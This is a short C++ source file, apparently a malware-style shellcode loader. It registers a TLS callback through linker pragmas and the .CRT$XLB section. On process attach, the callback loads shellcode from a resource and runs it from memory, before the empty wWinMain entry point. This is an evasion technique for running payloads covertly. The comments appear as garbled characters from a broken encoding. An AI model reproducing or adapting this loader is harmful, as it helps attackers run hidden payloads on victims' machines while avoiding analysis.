#include"public.hpp"



VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		//1.��ȡshellcode
		UINT shellcodeSize = 0;
		GetShellcodeFromRes(100, shellcodeSize);
		((void(*)())Memory)();
	}
}


#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")


#pragma data_seg (".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;
#pragma data_seg ()

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//4.ִ��shellcode
	return 0;
}